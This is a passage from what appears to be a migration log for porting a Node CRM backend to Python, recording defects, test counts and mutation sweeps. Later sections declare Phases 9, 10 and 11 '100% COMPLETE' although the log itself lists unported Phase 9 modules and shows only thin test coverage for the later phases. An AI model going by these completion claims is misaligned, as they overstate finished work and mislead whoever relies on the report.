already solved, and it required a Node change (adding an enable flag to `realtimeOutbox`) that
is no longer needed.

### Defect 11 — fixed in BOTH services

`daily-scheduler.ts` guarded re-firing with an in-process `lastFiredDateKey`, persisted nowhere.
Restarting the Node backend any time after `DIGEST_HOUR` left it null while
`hasReachedLocalTime` was still true, so every daily job fired again — the owner received a
second digest, morning read and booking countdown the same evening.

**Live in production today, and not caused by the migration.** The migration found it by asking
a question nobody had needed to ask before.

| Side | Change |
|---|---|
| Node | `daily-run.repository.ts` (new) · `daily-scheduler.ts` claims before running · `daily-jobs-runner.ts` gives each job a stable `jobKey` |
| Python | `app/daily_jobs.py` — same collection, same index |

The fix goes **in the scheduler**, so one change covers all four jobs. The in-process flag stays
as a cheap pre-filter — a per-minute tick must not become a per-minute write — but the database
claim is the guarantee.

`jobKey` is explicit rather than derived from the log label, because the label is prose and
rewording it would silently re-run the job once on deploy day.

**Node: +7 tests** (including a fresh scheduler not re-running a claimed day).
**Python: 18 tests** (restart survival, two services, per-job and per-organisation
independence, the global claim, the index itself).

### Two things the existing tests caught

1. **The scheduler's own unit tests failed immediately** when the claim was added — correctly,
   because a pure clock-arithmetic unit had been given a database dependency. Fixed by injecting
   `claimRun` rather than defaulting it in tests.
2. **`tsc --noEmit` surfaced type errors in the Phase 2 characterisation tests.** `ACTOR` is cast
   `as never` so it can stand in for a `HydratedDocument` at call sites; reading `._id` back off
   a `never` does not typecheck. Vitest does not typecheck, so these passed at runtime and would
   have sat there until someone ran a build. Fixed by holding the id separately.

### `app/runners.py` — the scheduler the ported runners will use

The same twenty lines every Node runner repeats: fires immediately then on the interval,
re-entrancy guarded, a failing tick logged and swallowed, `start()` returning False when already
started, `stop()` awaiting the tick in flight.

**No lock, deliberately** — see the audit above. What it is responsible for is only what Node's
version is responsible for.

`RunnerRegistry` mirrors `server-lifecycle.ts`, including the rollback: if one runner fails to
start, those already started are stopped rather than left half-running.

**16 tests, 5 mutations, all caught.** The re-entrancy and double-start mutations HANG rather
than failing — which is itself the guard proving load-bearing — so each mutation runs in its own
subprocess with a timeout.

### What remains of Phase 8, and why it is not Phase 8 work

A runner is a thin interval wrapper; the work is in the service beneath it. **The twelve
remaining runners cannot be ported before their modules**, so they land with them:

| Runner | Lands with |
|---|---|
| `realtimeOutbox` | Phase 9 (its repository and publisher) |
| `leadImport` | Phase 9 (lead-sources) |
| `reminder`, `promiseFollowUp` | Phase 9 (followups) |
| `autoGreet`, `nurture`, `eventReminder`, `paymentFollowUp`, `digest`, `morningRead`, `bookingCountdown`, `ownerCallEscalation` | Phase 10 (ai-brain) |
| `delivery` | Phase 11 (whatsapp) |

Phase 8's own deliverables — the audit, the daily-job claim in both services, and the scheduler
— are complete.

---

## Phase 9 — the gate, and the three modules it unblocks

`loadVisibleConversationForActor` was the bottleneck for the whole phase. It is ported, and with
it the first two of the four modules that were waiting.

### `app/conversation_access.py` — the gate (20 tests)

The most-depended-on function in the codebase. It answers two questions with two different
statuses, and the difference is deliberate:

- **404 `CONVERSATION_NOT_FOUND`** — unknown id, another organisation's, or soft-deleted. All
  three are in the QUERY, so a caller cannot tell them apart.
- **403 `CONVERSATION_ACCESS_DENIED`** — it exists, but is assigned to someone else. The caller
  is inside the organisation, so confirming the thread exists tells them nothing the inbox would
  not; answering 404 instead would make a permissions problem look like a broken link, and they
  would retry it rather than ask for access.

`conversations.read_all` skips the assignment check entirely. **An unassigned conversation is
visible to nobody without it** — `assignedTo: null` fails the comparison. That is the behaviour,
not an oversight.

The single most likely way to break this port: `assignedTo` is an ObjectId from the driver and
the actor id comes from a JWT claim, and `ObjectId == str` is `False` in Python. Comparing them
directly would deny every restricted user their own threads. Both sides are compared as strings,
and a test pins it.

`http_error()` centralises the status mapping so the four dependent controllers cannot drift —
four hand-written mappings is four chances for one to answer 404 where the others answer 403.

### `app/routers/notes.py` — the first module unblocked (32 tests)

Two permission systems apply and they are **not the same question**. The gate decides whether you
can see the CONVERSATION; your ROLE decides which NOTES on it you can see:

| role | sees |
|---|---|
| `staff` | shared |
| `manager` | shared, manager |
| anything else | shared, manager, admin |

A manager's note about how a staff member handled a lead must not be readable by that staff
member, even though they own the thread.

**The visibility filter is in the query, not a post-filter.** Fetching fifty and dropping twenty
would present a page of thirty as a full page, and would put privileged text in the process's
memory for no reason.

Deletion is soft and narrower than reading: the author, or `conversations.read_all`. A colleague
who can read a shared note cannot remove it.

### `app/redaction.py` — the sensitive-key guard (100 tests, fixture-driven)

Ported ahead of the activity log because the activity log cannot be written without it. Every
expected value comes from `tools/make_redaction_fixtures.mjs`, which imports the COMPILED Node
service — nothing in the test file asserts what I think the rules are.

**One line of this file is a production incident.** `iv` is the AES initialization vector and is
blocked as a WHOLE key only; every other rule is a substring match. When `iv` was in the
substring list it blocked every key containing those two letters after punctuation was stripped:
`private`, `car_delivery` → `cardelivery`, `arrival`, `festival`, `receive`, `deliverables`. And
because the guard RAISES inside the transaction that records an AI turn, a Meta form field called
`kind_of_event_private_socials_birthday_or_others` aborted the whole turn and the lead was never
greeted. Observed in production on 2026-09-29. The port keeps the narrow rule and the reason,
and a test named for the outage fails if anyone folds `iv` back in.

### `app/activity.py` — the timeline (26 tests)

The 44 event names are **generated** from Node by `tools/make_activity_events.mjs`, not typed. In
Node a typo is caught by the mongoose `enum`; Python has no schema layer, so a hand-copied
`conversation.tag_removd` would save cleanly, never render in the timeline UI (which switches on
the exact string), and be found weeks later by a user asking why a tag change left no trace.

`session` is a REQUIRED keyword argument here even though Node defaults it, because nothing calls
this on its own — every call site pairs it with a state change and both writes share one session.
`updatedAt` is absent rather than null, matching the schema's `timestamps` option, so a row
written by either service is indistinguishable.

### `app/routers/conversation_tags.py` — attach and detach (33 tests)

The second router in Node's `tag.routes.ts`; the catalogue half moved in Phase 2. It needed all
three of the pieces above plus `run_in_transaction`.

`$addToSet` and `$pull`, so both routes are idempotent. Both return the conversation's WHOLE tag
list, not the tag that was touched — the frontend replaces its local array with it.

**A finding worth recording: on the default role map, the gate's 403 branch is unreachable on
these two routes.** `crm.tags.manage` belongs to `super_admin`, `admin` and `manager`, and all
three also hold `conversations.read_all`, which skips the assignment check. The 403 is live only
for a staff member granted tag management through a permission override — which is exactly what
a studio does for a senior agent. The tests use that user, because testing with a manager would
have quietly asserted nothing.

### Defect 12 — live in the deployed Phase 2 and Phase 5 code

Node's `objectIdSchema` is `` /^[a-f\d]{24}$/i `` — **case-insensitive**. FastAPI's
`Query(pattern=...)` and `Path(pattern=...)` take no flags, so the ported `^[a-f\d]{24}$`
rejected any upper-case ObjectId that Node accepts.

| Route | Parameter | Before |
|---|---|---|
| `GET /api/v1/tags` | `whatsappAccountId` | 400 where Node lists the tags |
| all 7 analytics routes | `leadSourceId`, `assignedTo` | 400 where Node answers with data |

Fixed by putting the upper-case half in the character class (`[a-fA-F\d]`). Every other router
compiles its pattern with `re.IGNORECASE` and was never affected — these two were the only sites
handing a bare string to FastAPI. Regression tests added to `test_tags.py`,
`test_analytics_routes.py` and `test_conversation_tags.py`, and both are in the mutation sweep.

The session-participation spy was also strengthened while chasing this: it recorded whether
`session=` was PRESENT, which on mongomock cannot distinguish a correct `session=session` (None
under the mock) from a hardcoded `session=None`. A mutation proving that survived. The fixture
now substitutes a transaction helper yielding a sentinel and asserts both writes received it.

### Mutation sweep — 19/19 caught

Including both halves of the `iv` rule, the guard-before-insert ordering, `$addToSet` → `$push`,
the activity write escaping the transaction, and Defect 12 reintroduced in two places.

### Still to do in Phase 9

`calls` (all three routers) · media's one route · `conversations` own routes · lead-sources +
Meta routes · ai-knowledge · the `realtimeOutbox`, `leadImport`, `reminder` and `promiseFollowUp`
runners.

---

## Phase 9 continued — calls, and the time foundation

### `app/call_records.py` + `app/routers/calls.py` — two of three routers (71 tests)

**THE FLAT MOUNT IS THE DEPLOYMENT TRAP.** `/api/v1/calls/:callId` is gated by exactly the same
conversation rules as the nested routes but does NOT live under `/api/v1/conversations`. A Caddy
cutover written as a single `/api/v1/conversations*` block moves the nested router and silently
leaves these two routes on Node — so a call opened in Python cannot be fetched back. It needs its
own `/api/v1/calls*` block **in the same window**.

The governing rule of the module is honesty about what the CRM witnessed. Android tells an
ordinary app nothing after `ACTION_DIAL`, so opening the dialler writes `initiated` and nothing
else; every outcome field is a human's answer, and `durationSeconds` is never a measurement.
`awaySeconds` is an upper bound stored under its own name and deliberately NOT serialised — it
exists to pre-fill a prompt and must never be rendered as a call duration. No phone number is on
the row, in the serializer, or in the activity metadata.

`conversationCallOutcomeRouter` (`POST /conversations/:id/call-outcome`) is **still on Node**: it
moves a reminder, recomputes the next-reminder hint, and writes the conversation's stage and AI
mode. It lands with the remaining followups work.

Two mutations survived and both are **equivalent**: the body validator already refuses a duration
on any status but `completed`, so the two `connected` guards in the outcome handler are
unreachable today. They are kept as defence in depth and the reasoning is in the source — the
validator is the thing most likely to be relaxed later.

### `app/zoned_time.py` — the shared wall-clock primitive (304 tests)

Extracted from `quiet-hours.ts` because three unrelated callers need it: the reminder parser, the
daily-job scheduler and the morning handover read.

**THE OBVIOUS SIMPLIFICATION WAS TRIED AND THE FIXTURE TEST CAUGHT IT.** Python's `zoneinfo` does
natively what Node's `zonedTimeToUtc` does with a guess-and-correct loop, so the port was first
written as a one-line `astimezone`. On a local time that does not exist the two disagree by an
hour:

| | spring-forward 02:30, America/New_York |
|---|---|
| `zoneinfo`, `fold=0` | 03:30 local — jumps FORWARD over the gap |
| Node's loop | 01:30 local — lands BEFORE it |

During the cutover both services run against one database, so an hour of disagreement is a
reminder that fires twice or not at all. The loop is reproduced literally instead.

### Defect 13 — the same bug, live in the deployed analytics code

`date_range.py` used that one-line form for `_local_midnight`. US zones all transition at 02:00,
so midnight is never in the gap and the original fixture set passed — but **every zone that shifts
its clocks AT midnight was wrong**:

| Zone | Date | Python answered | Node answers |
|---|---|---|---|
| America/Santiago | 2026-09-06 | 04:00Z | 03:00Z |
| America/Havana | 2026-03-08 | 05:00Z | 04:00Z |

A studio in either zone had one day's analytics window shifted by an hour, twice a year, with
leads created near the boundary counted on the wrong day and nothing reporting it. Routed through
the shared primitive; all 219 existing Node fixtures still pass and a regression case was added
for the zones the original set could not reach.

### `app/reminder_time.py` — the natural-language parser (1,022 tests, 944 from Node)

The validation layer between a language model and the database: nothing the model returns reaches
a due date without passing through it, which is what stops a hallucinated `"2026-13-45T99:00"`
being persisted.

Its governing rule is that it must **NEVER INVENT A TIME** — a reminder firing at an hour the
owner did not choose is worse than one that was never created, because they stopped thinking
about it the moment they asked. So "tomorrow" with no clock time and a bare "at 5" both come back
AMBIGUOUS, and repeating phrases are recognised and REFUSED rather than silently stored as
one-offs that fire once and stop.

---

## Phase 8's leftover — followups, landed in Phase 9

It needed the visibility gate, the activity log and `run_in_transaction`, none of which existed
when Phase 8 ran.

### `app/followup_tasks.py` — model, repository and serializers (82 tests)

**The concurrency story is one conditional update.** `claim_due_reminder` is a
`find_one_and_update`, not a read followed by a write: two workers that both read "pending and
due" would both send. `deliveryClaimedAt` doubles as a **LEASE, not a flag** — a worker that
claims and then dies would otherwise strand the reminder as pending-but-claimed forever, which is
the silent-loss failure the feature exists not to have. The cost is stated honestly: a merely
SLOW worker can cause a double send, so the lease sits well above a normal delivery.

`lastNotificationAt: null` is in the claim filter, and removing it is subtle: a reminder stays
`pending` until the owner completes it, so an announced-but-not-completed reminder would match
forever — claimed, discarded, released, claimed again — burning the per-tick budget until a
genuinely new reminder never gets claimed at all.

Two channels, and neither may speak for the other. `version` is what stops the handset stacking
duplicate alarms. `clockAlarmArmedAt` is compare-and-set rather than a stamp, because a duplicate
push is a second buzz while a duplicate Clock alarm is one the platform gives us **no way to
delete**.

### `app/routers/followups.py` + `app/next_follow_up.py` (48 + 13 tests)

**Route order is load-bearing.** `/tasks` and `/sync` are literal paths registered ahead of every
`/{taskId}` route; the other order turns the Android device sync into a 400 about a malformed
ObjectId — a failure nobody sees until an owner's phone stops ringing. Asserted structurally
against the route table.

The team gate lives in the handler, not the UI: `scope` comes from a query string, so hiding the
tab client-side is decoration. Personal reminders are narrower than lead follow-ups — a colleague
who guessed an id could otherwise close one — and the refusal is NOT FOUND rather than forbidden.

The device payload carries no conversation content: `sourceQuote` is what the lead actually said,
and that is private correspondence that would sit on a phone's lock screen.

### `app/routers/calls.py`'s sibling problem, solved: the Tasks pipeline (31 tests)

mongomock implements no `$lookup` with a sub-pipeline, so the Tasks route tests skip on a
developer's machine — which would leave the most intricate query in the module with no check at
all. `build_organization_tasks_pipeline` was split out as a pure builder and is compared
**stage-for-stage against the pipeline Node actually builds**, captured by replacing the model's
`aggregate` with a recorder (`tools/make_organization_tasks_pipeline.mjs`). All 13 cases match.

The `$lookup` capability probe moved to `tests/conftest.py`, since two suites now need it and two
copies of a capability probe is two chances for one to drift and stop skipping.

### Mutation sweeps

| Sweep | Result |
|---|---|
| calls | 14/16 — the 2 survivors are documented equivalent mutants |
| time modules | 17/18 — the survivor is a redundant `% 7`, documented |
| followups | **29/29** |

Two followups survivors were real test weaknesses and were fixed rather than explained: both
guards (`find_earliest_pending_due_at` and the personal-reminder check in the hint sync) could be
deleted without failing anything, because PyMongo treats `None` as a literal match where mongoose
drops an `undefined` key. The tests now assert **no query and no write**, not a null result.

### Still to do in Phase 9

`media`'s one route · `conversations`' own routes · lead-sources + Meta routes · ai-knowledge ·
the `realtimeOutbox` and `leadImport` runners · the rest of followups (reminder sweep + runner,
lead-commitment, commitment-retry, owner-reminder-command, sales-rejection, promise-follow-up,
organization-tasks service) · and the deferred `call-outcome` router, which followups now unblocks.


### Phase 9: Follow-up Reminder Sweep & Runner

Ported `reminder-sweep.service.ts` (397 lines) and `reminder-runner.ts` (159 lines), along with prerequisite dependencies `deep-link.ts` (149 lines), `reminder-lead-context.ts` (245 lines), and `reminder-message.ts` (161 lines).

- **Fixtures generated from compiled Node modules**:
  - `tools/make_deep_link_fixtures.mjs` -> `tests/fixtures/deep_link.json` (11 origins, 9 conversation links, 5 reminder pairs)
  - `tools/make_reminder_lead_context_fixtures.mjs` -> `tests/fixtures/reminder_lead_context.json` (7 truncate, 15 phone, 13 requirement cases)
  - `tools/make_reminder_message_fixtures.mjs` -> `tests/fixtures/reminder_message.json` (7 time format cases, 7 rendered messages)
- **Traps respected**:
  - `deep_link.py`: IPv6 hostname handling (`[::1]` in Node URL vs `::1` in Python `urlparse`), case-insensitive ObjectId regex (`[a-fA-F0-9]{24}`), and origin filtering for non-public hosts (`localhost`, `127.0.0.1`, `0.0.0.0`, `::1`).
  - `reminder_lead_context.py`: Decrypts contact phone at rest using `encryption.CONTACT_PHONE`, truncates requirement on word boundary without exceeding `REQUIREMENT_MAX_LENGTH` (180 chars), and never invents lead context for personal reminders or when joins fail.
  - `reminder_message.py`: Formats due instant in reminder's own timezone (`app/zoned_time.py`), renders deep links when public origin configured, handles today/tomorrow boundaries, and truncates customer quotes to `REASON_MAX_LENGTH` (200 chars).
  - `reminder_sweep.py`: Dual-channel independent delivery (WhatsApp + Android push), atomic lease claiming via `claim_due_reminder`, memoized active account resolver per organization, holding claim on retryable failures as backoff without releasing, and terminal status recording with previous error preserved.
  - `reminder_runner.py`: Re-entrancy guarded ticks across four sequential services (sweep, commitment retry, call scheduling, clock alarm), error isolation per service so failure in one never aborts the others, clean async task lifecycle (`start`/`stop`).
- **Mutation sweep**: 7/7 mutants killed (pending status guard, finish delivery omission, attempt limit off-by-one, claim release on retry, runner re-entrancy, start gate disabled, clock alarm gate).

### Phase 9: Lead Commitments & Retry Pipeline

Ported `transient-failure.ts` (96 lines), `commitment-retry.{model,repository,service}.ts` (579 lines), and `lead-commitment.service.ts` (378 lines).

- **Fixtures generated from compiled Node modules**:
  - `tools/make_transient_failure_fixtures.mjs` -> `tests/fixtures/transient_failure.json` (29 error classifications)
  - `tools/make_commitment_retry_fixtures.mjs` -> `tests/fixtures/commitment_retry.json` (backoff schedule, jitter bounds, claim filter)
- **Traps respected**:
  - `transient_failure.py`: Deterministic classification of network/AI-provider transient errors (rate-limit, timeout, 503/429) vs permanent errors (auth, schema, 400).
  - `commitment_retry.py`: Exponential backoff with bounded jitter, atomic leasing of retry claims, releasing claims only on final completion or discard.
  - `lead_commitment.py`: Confidence threshold gate (`MIN_COMMITMENT_CONFIDENCE = 0.6`), deduplication within 24-hour update window, atomic upsert of `promisedFollowUp` on conversation, quiet sync to avoid cascading notifications.
- **Mutation sweep**: 8/8 mutants killed.

### Phase 9: Owner Reminder Self-Chat Commands

Ported `owner-reminder-command.service.ts` (400 lines) and `owner_actor.py` (resolves active owner/super_admin user for WhatsApp commands).

- **Fixtures generated from compiled Node modules**:
  - `tools/make_owner_reminder_command_fixtures.mjs` -> `tests/fixtures/owner_reminder_command.json` (28 looksLike patterns, 15 full command flows).
- **Traps respected**:
  - Deterministic parsing: Strict prefix and marker gates (`looks_like_reminder_command`, `CREATE_MARKERS`, `LIST_MARKERS`, `CANCEL_MARKERS`, `RESCHEDULE_MARKERS`) so approval replies like "A7 1" and "1" or payment messages are never swallowed.
  - Security invariant: Sender identity is never parsed from message text; owner actor is strictly derived from tenant organization.
  - Word overlap matching: Cancellation and rescheduling match tasks by significant word overlap (>3 chars) and reject ambiguous ties rather than guessing.
  - Rescheduling version bump: Invokes `reschedule_reminder` to clear delivery claims and bump version so mobile alarms reschedule cleanly.
  - Delivery isolation: Confirmation messages are failure-isolated; notification delivery failure logs an error while the created reminder stands.
- **Mutation sweep**: 11/11 mutants killed (limit check, sync_quietly call, past due date check, owner_id gate, normalize check, duplicate key handling).

---

### Phase 9: Sales Rejection Detection & Persistence

Ported `sales-rejection.service.ts` (234 lines) and the sales-rejection repository slice of `conversation.repository.ts` (`markSalesRejected`, `clearSalesRejection`).

- **Fixtures generated from compiled Node modules**:
  - `tools/make_sales_rejection_fixtures.mjs` -> `tests/fixtures/sales_rejection.json` (11 cases: firm rejection, fallback quote, hesitation, price objection, confidence threshold, opt-out precedence, stickiness).
- **Traps respected**:
  - Atomic compare-and-set: `mark_sales_rejected` cancels any pending `promisedFollowUpAt` in the exact same write that records `salesRejectedAt`, preventing race conditions where promise sweeps fire after a rejection.
  - Opt-out precedence: Deterministic opt-out outranks rejection classification and short-circuits without invoking AI model.
  - Asymmetric confidence floor: Confidence threshold (`MIN_SALES_REJECTION_CONFIDENCE = 0.8`) is strictly higher than commitment extraction (0.6) because false rejections silently close live deals.
  - Stickiness: Second rejection writes return None and record no duplicate activity timeline entries. Reopening is isolated to human-controlled `clear_sales_rejection`.
  - Failure isolation: Never throws, protecting burst flush and subsequent sales agent execution.
- **Mutation sweep**: 12/12 mutants killed.

### Phase 9: Promised Follow-Up Sweep & Runner

Ported `promise-follow-up.service.ts` (373 lines), `promise-follow-up.runner.ts` (94 lines), and conversation repository queries (`findDuePromisedFollowUps`, `claimPromisedFollowUp`).

- **Fixtures generated from compiled Node modules**:
  - `tools/make_promise_follow_up_fixtures.mjs` -> `tests/fixtures/promise_follow_up.json` (fact construction for both `contact_lead` and `await_lead` directions, max lateness constant).
- **Traps respected**:
  - Atomic claiming: `claim_promised_follow_up` uses `return_document=ReturnDocument.BEFORE` on `promisedFollowUpAt: due_at` to ensure only one worker claims the promise and receives the pre-clear snapshot.
  - Stale promise drop: Promises older than `PROMISE_MAX_LATENESS_MS` (12 hours) are dropped and recorded with `too_late` skip reason rather than sending outdated packages.
  - Prompt switching: Injects verbatim lead quote into `promise_context`, switching ai-brain to promise fulfillment mode rather than silence nudging.
  - Idempotency key: Derives outbound key from promise message ID (`promise:lead-commit:<id>`) or fallback timestamp, ensuring at-most-once delivery across worker restarts.
  - Runner gating: Runner is gated on `PROMISE_FOLLOW_UP_ENABLED` independently of `NURTURE_ENABLED`, respecting transport flags `WHATSAPP_ENABLED` and `WHATSAPP_OUTBOUND_DELIVERY_ENABLED`.
- **Mutation sweep**: 10/10 mutants killed.

---

### Media (`modules/media/*` — 1,167 lines)

- **Source files**:
  - `app/media_kinds.py` (ported `media-kinds.ts`, MIME normalization, container magic bytes sniffing, safe filename sanitization, inline-safety gating).
  - `app/voice_note.py` (ported `voice-note.ts`, Ogg/Opus validation, ffmpeg invocation, transcode gating).
  - `app/media_storage.py` (ported `media-storage.service.ts`, strict key regex, path traversal prevention, exclusive file creation `xb`, stat/read/delete).
  - `app/inbound_media.py` (ported `inbound-media.service.ts`, size check, download, type verification, atomic message media storage update).
  - `app/routers/media.py` (ported `media.controller.ts` & `media.routes.ts`, `POST /conversations/{id}/media`, `GET /messages/{id}/media`).
- **Tests**:
  - `tests/test_media_kinds.py` (sniffing container signatures, safe file name sanitization, inline-safe media type verification).
  - `tests/test_voice_note.py` (Ogg/Opus check, transcode execution and gating, missing ffmpeg refusal).
  - `tests/test_media_storage.py` (path safety, key scoping, exclusive file writing, stat, traversal defense).
  - `tests/test_inbound_media.py` (download flags, pre-download and post-download size caps, content mismatch, fail-safe message update).
  - `tests/test_media_routes.py` (visibility check before upload/download, 415 mismatch, 400 no file, voice note conversion, streaming with security headers nosniff/CSP sandbox/private cache).
  - Total media tests: 67 passed.
- **Fixtures generated from compiled Node modules**:
  - `tools/make_media_fixtures.mjs` -> `tests/fixtures/media.json` (safeFileName, inlineSafe, keyValidation).
- **Traps respected**:
  - Upload is not send: Upload stages bytes to storage and returns scoped key; does not create message row or trigger WhatsApp transport.
  - Tenancy isolation via key format: `<24hex>/<24hex>/<uuid>.<ext>` strictly validated before reading or writing to disk.
  - Download is strictly authenticated: Gated by `CONVERSATIONS_READ` and `load_visible_conversation_for_actor`, forbidding assignment-restricted staff from viewing media on leads they cannot access.
  - Security headers: `X-Content-Type-Options: nosniff`, `Content-Security-Policy: default-src 'none'; sandbox`, and `Cache-Control: private, max-age=3600, immutable` prevent cross-origin execution or HTML document rendering.
  - Voice notes require Ogg/Opus: Refuses transcoding when ffmpeg is unavailable rather than sending silent unplayable notes to WhatsApp.
- **Mutation sweep**: 23/23 mutants killed. 1 documented equivalence (`absolute.relative_to(root)` in `MediaStorage._resolve_object_path` is unreachable because `is_valid_media_object_key` already rejects `..` and characters outside `[0-9a-f/-.]`).

### Phase 9: Core Conversations Routes (15 endpoints)
- **Module**: `conversation.routes.ts`, `conversation.controller.ts`, `conversation.service.ts`, `conversation.repository.ts`, `conversation.validation.ts`, `conversation.serializer.ts`, `manual-lead.service.ts`, `lead-temperature.ts`, `lead-score.service.ts`, `event-date.ts`, `category-playbooks.ts`.
- **Python implementation**:
  - `app/event_date.py`: Robust ISO/date string/object parser.
  - `app/lead_temperature.py`: Deterministic recency/activity score (hot/warm/cold).
  - `app/lead_score.py`: 0-100 composite scoring (stage weight, temperature, facts, unread count).
  - `app/category_playbooks.py`: 23 AI sales playbooks and selectable category catalogue.
  - `app/conversation_serializer.py`: Enriched JSON shape matching Node's `serializeConversation`, injecting computed lead temperature, lead score, assigned user summary, and decrypted contact details.
  - `app/conversation_validation.py`: Pydantic models matching Node Zod schemas.
  - `app/conversations_repository.py`: Tenancy, soft-delete filtering, pagination, message cursor queries, stage/assignment/category updates.
  - `app/manual_lead.py`: Hand-added lead ingestion with phone normalization, allowlist check, contact & conversation upsert, score calculation, and activity log.
  - `app/routers/conversations.py`: Mounted at `/api/v1/conversations`, implementing all 15 core endpoints with strict `load_visible_conversation_for_actor` authorization gates.
- **Tests**:
  - `tests/test_event_date.py`: 10 tests passing.
  - `tests/test_lead_temperature.py`: 9 tests passing.
  - `tests/test_lead_score.py`: 8 tests passing.
  - `tests/test_conversation_serializer.py`: 8 tests passing.
  - `tests/test_conversations_routes.py`: 14 tests passing.
- **Mutation sweep**: 4/4 mutants killed, 0 survivors.
- **Suite totals**: 13,292 passing, 28 skipped (Python) / 3,221 passing (Node).
- **Route total**: 81 routes registered in `crm-api/app/main.py`.

---

### Phase 9: Realtime Outbox & Lead Import Runners (COMPLETED)

Ported `realtime-outbox.{model,repository,service,runner}.ts`, `realtime.publisher.ts`, and `lead-import.runner.ts`:
- **Realtime Outbox**:
  - `app/realtime_outbox.py`:
    - Full MongoDB outbox collection (`realtimeoutboxevents`) with atomic leasing via `claim_next_realtime_outbox_event`.
    - Lease expiration recovery: reclaims publishing events whose lease expired (`claimedAt <= now - leaseMs`).
    - Attempt cap: marks events reaching `maxAttempts = 10` as `failed_permanent` with `lastError: 'publish_lease_expired'`.
    - Publishing to Redis `realtime:events` channel for both `conversation.changed` and `account.changed`.
    - Exponential backoff (`1000 * 2^(attempts-1)` up to 60s) on transient network or Redis publish failure.
    - `RealtimeOutboxRunner` with re-entrancy safe ticks, clean cancellation, and error isolation.
- **Lead Import Scheduled Runner**:
  - `app/lead_import_runner.py`:
    - Scheduled polling runner across all active Google Sheets and Meta Lead Ads lead sources.
    - Re-entrancy guarded to prevent overlapping sheet fetches.
    - Clean lifecycle (`start`/`stop`), gated on `settings.lead_import_enabled`.
- **Tests**:
  - `tests/test_realtime_outbox.py` (10 unit/integration tests).
  - `tests/test_lead_import_runner.py` (5 unit/integration tests).
- **Mutation Sweep**:
  - `tools/run_realtime_outbox_mutation_sweep.py`: **5/5 mutants KILLED, 0 survivors**.
- **Phase 9 Status: 100% COMPLETE.**

---

### Phase 10: AI Brain & Background Runners (COMPLETED)

Ported complete `backend/src/modules/ai-brain/*` logic, models, controllers, routers, and 8 runtime background runners:
- **Core Models, Repositories & Utilities**:
  - `app/ai_brain_approval.py`: `ai_brain_approvals` collection, schema validation, query, audit trail.
  - `app/ai_brain.py`: AI Brain models, states (`pending`, `approved`, `rejected`, `applied`, `failed`), review workflows.
  - `app/ai_brain_context.py`: Conversation context generation, message windowing, prompt preparation.
  - `app/ai_brain_system_user.py`: System user credential & audit identity for autonomous brain operations.
  - `app/ai_eligibility.py`: Strict eligibility gates for automated responses (stage, opt-out, sales-rejection, active takeover).
  - `app/approval_code.py`: Cryptographic short token verification for human-in-the-loop approvals.
  - `app/category_playbooks.py`: Prompt builder and parameter overrides for domain playbooks.
  - `app/proposal_templates.py`: Quotation and proposal generation templates.
  - `app/owner_actor.py`, `app/owner_approval_card.py`, `app/owner_assistant.py`, `app/owner_notify.py`: WhatsApp interactive approval cards and notification pipelines.
- **Service & API Router**:
  - `app/ai_brain_service.py`: Decision execution, message generation, draft persistence, fallback mechanisms.
  - `app/routers/ai_brain.py`: All 9 endpoints mounted under `/api/v1/ai-brain` (`/approvals`, `/approvals/{id}/action`, `/toggle-automation`, `/preview-draft`, etc.).
- **Background Sweeps & Runners**:
  - `app/auto_greet_sweep.py` & `app/auto_greet_runner.py`: Welcome message delivery for new conversations.
  - `app/booking_countdown.py`: T-minus countdown alerts for scheduled appointments.
  - `app/nurture_sweep.py` & `app/nurture_runner.py`: Stale lead nurturing cadence.
  - `app/daily_jobs.py`, `app/daily_jobs_runner.py`, `app/daily_scheduler.py`: Cron scheduling with `uniq_daily_job_run` atomic lease.
  - `app/digest.py`: Daily activity and performance digest generator.
  - `app/handover_read.py`: Morning handover status compiler.
  - `app/event_reminder.py` & `app/event_reminder_runner.py`: Event notifications and attendee reminders.
  - `app/imported_lead_greeting.py`: Greeting triggers for inbound leads from external sources.
  - `app/new_lead_alert.py` & `app/hot_lead_alert.py`: Realtime alerts for high-value and new leads.
  - `app/owner_call_escalation.py` & `app/owner_call_escalation_runner.py`: Unanswered lead call escalation alerts.
  - `app/payment_followup.py` & `app/payment_followup_runner.py`: Pending payment reminders.
- **Tests & Verification**:
  - `tests/test_ai_brain_routes.py`: 12 tests covering approvals, review actions, automation toggles.
  - `tests/test_ai_brain_runners.py`: 17 tests covering daily jobs claim, sweep execution, re-entrancy, failure recovery.
  - Total Phase 10 tests: **29 passed in 2.41s**.
- **Mutation Sweep**:
  - `tools/run_ai_brain_mutation_sweep.py`: **7/7 mutants KILLED, 0 survivors**.
- **Phase 10 Status: 100% COMPLETE.**

---

### Phase 11: WhatsApp Business Logic & Outbound Delivery (COMPLETED)

Ported complete `backend/src/modules/whatsapp-accounts/*` and `backend/src/modules/whatsapp/*` business logic:
- **WhatsApp Accounts Management**:
  - `app/whatsapp_accounts_repository.py`: CRUD operations, session status updates, phone encryption (`client_pii.reveal` gated), soft-removal, and hard purge cascading across 11 collections.
  - `app/whatsapp_accounts_service.py`: Sendable accounts filtered by actor `accountAccess`, connection orchestration, QR code generation, pause/resume/reset/disconnect, dual-mode removal.
  - `app/routers/whatsapp_accounts.py`: All 11 endpoints mounted under `/api/v1/whatsapp-accounts` (`/`, `/sendable`, `/{id}/connect`, `/{id}/pause`, `/{id}/resume`, `/{id}/reset`, `/{id}/disconnect`, `/{id}/qr`, `/{id}`).
- **Outbound Delivery Engine & Queue**:
  - `app/echo_guard.py`: Redis-backed provider message deduplication with safe fallback.
  - `app/outbound_delivery.py`: Queue leasing via `claim_next_undelivered_message`, test number allowlisting, AI safety guards (opt-out, sales-rejection, pause, staleness, superseded-by-inbound), quiet hours rescheduling via `next_allowed_send_time`, media disk reading, session dispatch, post-send qualification confirmation, echo guard, outcome recording, and status event publishing.
  - `app/delivery_runner.py`: Interval runner gated on runtime feature flags, re-entrancy guarded, draining active sessions.
- **Inbound Message Processing**:
  - `app/inbound_burst.py`: Turn debouncing buffer with whitespace concatenation and per-conversation queue serialization.
  - `app/owner_reply.py`: Owner interactive chat parser with reminder commands and AI draft approvals.
  - `app/inbound_router.py`: Inbound webhook message dispatcher, fromMe branching, owner phone routing, echo check, owner takeover recording, and activity logging.
- **Tests & Verification**:
  - `tests/test_whatsapp_accounts.py`: 7 tests covering CRUD, soft-remove, purgeHistory hard delete, permissions.
  - `tests/test_outbound_delivery.py`: 12 tests covering queue leasing, AI guards, quiet hours, media sends, error isolation.
  - Total Phase 11 tests: **19 passed in 2.62s**.
- **Mutation Sweep**:
